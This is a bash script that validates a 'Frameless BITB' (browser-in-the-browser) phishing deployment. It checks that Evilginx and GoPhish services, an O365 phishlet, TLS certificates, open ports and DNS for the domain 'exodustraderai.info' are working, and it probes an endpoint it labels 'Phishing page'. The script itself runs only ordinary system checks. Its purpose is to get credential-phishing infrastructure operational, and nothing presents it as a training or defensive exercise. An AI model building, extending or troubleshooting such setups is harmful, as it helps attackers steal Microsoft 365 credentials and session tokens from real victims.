#!/bin/bash

#############################################
# Frameless BITB - Setup Validation Script
# Tests all components and reports status
#############################################

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

DOMAIN="${DOMAIN:-exodustraderai.info}"
ERRORS=0
WARNINGS=0

header() {
    echo -e "${BLUE}═══════════════════════════════════════════════════════${NC}"
    echo -e "${BLUE}  $1${NC}"
    echo -e "${BLUE}═══════════════════════════════════════════════════════${NC}"
}

pass() {
    echo -e "${GREEN}✓${NC} $1"
}

fail() {
    echo -e "${RED}✗${NC} $1"
    ((ERRORS++))
}

warn() {
    echo -e "${YELLOW}⚠${NC} $1"
    ((WARNINGS++))
}

info() {
    echo -e "${BLUE}ℹ${NC} $1"
}

# Test system requirements
test_system() {
    header "System Requirements"

    # Check OS
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        if [[ "$ID" == "ubuntu" ]] || [[ "$ID" == "debian" ]]; then
            pass "Operating System: $PRETTY_NAME"
        else
            warn "Operating System: $PRETTY_NAME (Ubuntu/Debian recommended)"
        fi
    else
        warn "Could not detect operating system"
    fi

    # Check if running as root
    if [ "$EUID" -eq 0 ]; then
        pass "Running as root"
    else
        fail "Not running as root (required for full validation)"
    fi

    # Check available memory
    MEM_TOTAL=$(free -m | awk '/^Mem:/{print $2}')
    if [ "$MEM_TOTAL" -gt 1024 ]; then
        pass "Memory: ${MEM_TOTAL}MB available"
    else
        warn "Memory: ${MEM_TOTAL}MB (2GB+ recommended)"
    fi

    # Check disk space
    DISK_AVAIL=$(df -BG / | awk 'NR==2 {print $4}' | sed 's/G//')
    if [ "$DISK_AVAIL" -gt 10 ]; then
        pass "Disk space: ${DISK_AVAIL}GB available"
    else
        warn "Disk space: ${DISK_AVAIL}GB (20GB+ recommended)"
    fi

    echo ""
}

# Test network configuration
test_network() {
    header "Network Configuration"

    # Check internet connectivity
    if ping -c 1 8.8.8.8 &>/dev/null; then
        pass "Internet connectivity"
    else
        fail "No internet connectivity"
    fi

    # Check DNS resolution
    if nslookup google.com &>/dev/null; then
        pass "DNS resolution"
    else
        fail "DNS resolution failed"
    fi

    # Get server IP
    SERVER_IP=$(curl -s --max-time 5 ifconfig.me 2>/dev/null)
    if [ -n "$SERVER_IP" ]; then
        pass "External IP: $SERVER_IP"
    else
        warn "Could not determine external IP"
    fi

    # Check domain DNS
    DOMAIN_IP=$(dig +short "$DOMAIN" | head -1)
    if [ -n "$DOMAIN_IP" ]; then
        info "Domain $DOMAIN resolves to: $DOMAIN_IP"
        if [ "$SERVER_IP" == "$DOMAIN_IP" ]; then
            pass "Domain DNS configured correctly"
        else
            warn "Domain does not resolve to this server ($SERVER_IP vs $DOMAIN_IP)"
        fi
    else
        warn "Domain $DOMAIN does not resolve"
    fi

    echo ""
}

# Test installed packages
test_packages() {
    header "Required Packages"

    PACKAGES=(git wget curl make gcc apache2 tmux sqlite3 go)

    for pkg in "${PACKAGES[@]}"; do
        if command -v "$pkg" &>/dev/null; then
            VERSION=$(eval "$pkg --version 2>&1 | head -1" || echo "installed")
            pass "$pkg: $VERSION"
        else
            fail "$pkg not installed"
        fi
    done

    echo ""
}

# Test services
test_services() {
    header "Service Status"

    # Check Apache
    if systemctl is-active --quiet apache2; then
        pass "Apache2 is running"

        # Test Apache config
        if apache2ctl configtest &>/dev/null; then
            pass "Apache configuration valid"
        else
            fail "Apache configuration invalid"
        fi
    else
        warn "Apache2 is not running"
    fi

    # Check Evilginx
    if systemctl is-active --quiet evilginx; then
        pass "Evilginx service is running"
    else
        warn "Evilginx service is not running"
    fi

    # Check GoPhish
    if systemctl is-active --quiet gophish; then
        pass "GoPhish service is running"
    else
        warn "GoPhish service is not running"
    fi

    echo ""
}

# Test ports
test_ports() {
    header "Port Status"

    PORTS=("80:HTTP" "443:HTTPS" "53:DNS" "3333:GoPhish" "8443:Evilginx")

    for port_info in "${PORTS[@]}"; do
        PORT=$(echo "$port_info" | cut -d: -f1)
        NAME=$(echo "$port_info" | cut -d: -f2)

        if netstat -tuln | grep -q ":$PORT "; then
            pass "Port $PORT ($NAME) is listening"
        else
            warn "Port $PORT ($NAME) is not listening"
        fi
    done

    echo ""
}

# Test SSL certificates
test_ssl() {
    header "SSL Certificates"

    # Check Let's Encrypt
    if [ -d "/etc/letsencrypt/live/$DOMAIN" ]; then
        pass "Let's Encrypt certificates found"

        CERT_FILE="/etc/letsencrypt/live/$DOMAIN/fullchain.pem"
        EXPIRY=$(openssl x509 -enddate -noout -in "$CERT_FILE" 2>/dev/null | cut -d= -f2)
        info "Expires: $EXPIRY"
    elif [ -d "/etc/ssl/localcerts/$DOMAIN" ]; then
        warn "Using self-signed certificates"

        CERT_FILE="/etc/ssl/localcerts/$DOMAIN/fullchain.pem"
        if [ -f "$CERT_FILE" ]; then
            EXPIRY=$(openssl x509 -enddate -noout -in "$CERT_FILE" 2>/dev/null | cut -d= -f2)
            info "Expires: $EXPIRY"
        fi
    else
        fail "No SSL certificates found"
    fi

    # Test SSL connection
    if timeout 5 openssl s_client -connect "$DOMAIN:443" </dev/null &>/dev/null; then
        pass "SSL connection successful"
    else
        warn "SSL connection failed"
    fi

    echo ""
}

# Test file structure
test_files() {
    header "File Structure"

    DIRS=(
        "/opt/evilginx"
        "/opt/gophish"
        "/var/www/home"
        "/var/www/primary"
        "/var/www/secondary"
        "/etc/apache2/custom-subs"
    )

    for dir in "${DIRS[@]}"; do
        if [ -d "$dir" ]; then
            FILES=$(find "$dir" -type f | wc -l)
            pass "$dir ($FILES files)"
        else
            fail "$dir not found"
        fi
    done

    # Check Evilginx binary
    if [ -x "/opt/evilginx/evilginx" ]; then
        pass "Evilginx binary is executable"
    else
        fail "Evilginx binary not found or not executable"
    fi

    # Check GoPhish binary
    if [ -x "/opt/gophish/gophish" ]; then
        pass "GoPhish binary is executable"
    else
        fail "GoPhish binary not found or not executable"
    fi

    echo ""
}

# Test web endpoints
test_endpoints() {
    header "Web Endpoints"

    ENDPOINTS=(
        "https://$DOMAIN/:Base domain"
        "https://login.$DOMAIN/:Login subdomain"
        "https://login.$DOMAIN/?auth=2:Phishing page"
    )

    for endpoint_info in "${ENDPOINTS[@]}"; do
        URL=$(echo "$endpoint_info" | cut -d: -f1-2)
        NAME=$(echo "$endpoint_info" | cut -d: -f3)

        HTTP_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "$URL" 2>/dev/null)

        if [ "$HTTP_CODE" == "200" ] || [ "$HTTP_CODE" == "302" ]; then
            pass "$NAME - HTTP $HTTP_CODE"
        else
            warn "$NAME - HTTP $HTTP_CODE (expected 200/302)"
        fi
    done

    echo ""
}

# Test Evilginx configuration
test_evilginx_config() {
    header "Evilginx Configuration"

    # Check config file
    if [ -f "/root/.evilginx/config.json" ]; then
        pass "Evilginx config file exists"

        EVILGINX_PORT=$(jq -r '.https_port' /root/.evilginx/config.json 2>/dev/null)
        if [ "$EVILGINX_PORT" == "8443" ]; then
            pass "Evilginx port: $EVILGINX_PORT"
        else
            warn "Evilginx port: $EVILGINX_PORT (expected 8443)"
        fi
    else
        fail "Evilginx config file not found"
    fi

    # Check phishlets
    if [ -d "/opt/evilginx/phishlets" ]; then
        PHISHLET_COUNT=$(ls -1 /opt/evilginx/phishlets/*.yaml 2>/dev/null | wc -l)
        pass "Phishlets directory ($PHISHLET_COUNT phishlets)"
    else
        fail "Phishlets directory not found"
    fi

    # Check O365 phishlet
    if [ -f "/opt/evilginx/phishlets/O365.yaml" ]; then
        pass "O365 phishlet installed"
    else
        warn "O365 phishlet not found"
    fi

    echo ""
}

# Test GoPhish configuration
test_gophish_config() {
    header "GoPhish Configuration"

    # Check config file
    if [ -f "/opt/gophish/config.json" ]; then
        pass "GoPhish config file exists"

        ADMIN_PORT=$(jq -r '.admin_server.listen_url' /opt/gophish/config.json 2>/dev/null | cut -d: -f2)
        pass "GoPhish admin port: $ADMIN_PORT"
    else
        fail "GoPhish config file not found"
    fi

    # Check database
    if [ -f "/opt/gophish/gophish.db" ]; then
        DB_SIZE=$(du -h /opt/gophish/gophish.db | cut -f1)
        pass "GoPhish database ($DB_SIZE)"
    else
        warn "GoPhish database not found (will be created on first run)"
    fi

    echo ""
}

# Test firewall
test_firewall() {
    header "Firewall Configuration"

    if command -v ufw &>/dev/null; then
        if ufw status | grep -q "Status: active"; then
            pass "UFW firewall is active"

            # Check rules
            if ufw status | grep -q "443/tcp"; then
                pass "Port 443 allowed"
            else
                warn "Port 443 not allowed"
            fi

            if ufw status | grep -q "80/tcp"; then
                pass "Port 80 allowed"
            else
                warn "Port 80 not allowed"
            fi
        else
            warn "UFW firewall is not active"
        fi
    else
        info "UFW not installed (firewall check skipped)"
    fi

    echo ""
}

# Generate report
generate_report() {
    header "Validation Summary"

    TOTAL_TESTS=$((ERRORS + WARNINGS))

    echo ""
    echo -e "Total Checks: ${BLUE}$TOTAL_TESTS${NC}"
    echo -e "Errors: ${RED}$ERRORS${NC}"
    echo -e "Warnings: ${YELLOW}$WARNINGS${NC}"
    echo ""

    if [ $ERRORS -eq 0 ] && [ $WARNINGS -eq 0 ]; then
        echo -e "${GREEN}✓ All checks passed! System is ready.${NC}"
        return 0
    elif [ $ERRORS -eq 0 ]; then
        echo -e "${YELLOW}⚠ System is functional but has warnings.${NC}"
        echo -e "${YELLOW}Review warnings above for potential issues.${NC}"
        return 1
    else
        echo -e "${RED}✗ System has errors that need to be resolved.${NC}"
        echo -e "${RED}Please fix the errors above before proceeding.${NC}"
        return 2
    fi
}

# Main function
main() {
    clear
    echo -e "${BLUE}"
    echo "╔═══════════════════════════════════════════════════════════════╗"
    echo "║       Frameless BITB - Setup Validation & Testing            ║"
    echo "║                Domain: $DOMAIN                                ║"
    echo "╚═══════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo ""

    test_system
    test_network
    test_packages
    test_services
    test_ports
    test_ssl
    test_files
    test_endpoints
    test_evilginx_config
    test_gophish_config
    test_firewall
    generate_report

    EXIT_CODE=$?
    echo ""
    exit $EXIT_CODE
}

main "$@"
